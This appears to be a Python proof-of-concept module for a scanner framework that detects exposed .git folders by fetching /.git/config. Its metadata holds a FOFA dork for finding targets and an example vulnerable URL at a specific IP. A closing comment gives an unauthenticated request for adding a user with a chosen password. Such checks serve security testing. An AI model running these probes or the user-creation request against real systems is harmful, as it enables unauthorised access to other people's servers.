# coding:utf-8  
import requests
from lib.common import url_handle
# ...
import urllib3
urllib3.disable_warnings()
_info = {
    "author" : "jijue",                      # POC作者
    "version" : "1",                    # POC版本，默认是1  
    "CreateDate" : "2021-06-08",        # POC创建时间
    "UpdateDate" : "2021-06-08",        # POC创建时间
    "PocDesc" : """
    略  
    """,                                # POC描述，写更新描述，没有就不写

    "name" : ".git信息泄露",                        # 漏洞名称
    "AppName" : "通用",                     # 漏洞应用名称
    "AppVersion" : "无",                  # 漏洞应用版本
    "VulnDate" : "2020-12-29",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
    "VulnDesc" : """
    开发人员使用git进行版本控制，对站点自动部署。
    如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。
    """,                                # 漏洞简要描述

    "fofa-dork":"title:\".git\"",                     # fofa搜索语句
    "example" : "https://47.108.74.113/v1/auth/users?pageNo=1&pageSize=100",                     # 存在漏洞的演示url，写一个就可以了
    "exp_img" : "",                      # 先不管  

    "timeout" : 5,                      # 超时设定
}

def verify(host,proxy):
    """
    返回vuln

    存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

    不存在漏洞：vuln = [False,""]
    """
    vuln = [False,""]
    url = url_handle(host) + "/.git/config" # url自己按需调整

    if proxy:
        proxies = {
        "http": "http://%s"%(proxy),
        "https": "http://%s"%(proxy),
        }
    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                "Connection":"close",
                # "Content-Type": "application/x-www-form-urlencoded",
                }
    
    try:
        """
        检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
        """
        req = requests.get(url,headers = headers , timeout = _info["timeout"],verify = False)
        if req.status_code == 200 and "repositoryformatversion" in req.text:
            vuln = [True,req.text]
        else:
            vuln = [False,req.text]
    except Exception as e:
        raise e
    
    return vuln

# add user
# POST /v1/auth/users?username=ttt&password=ttt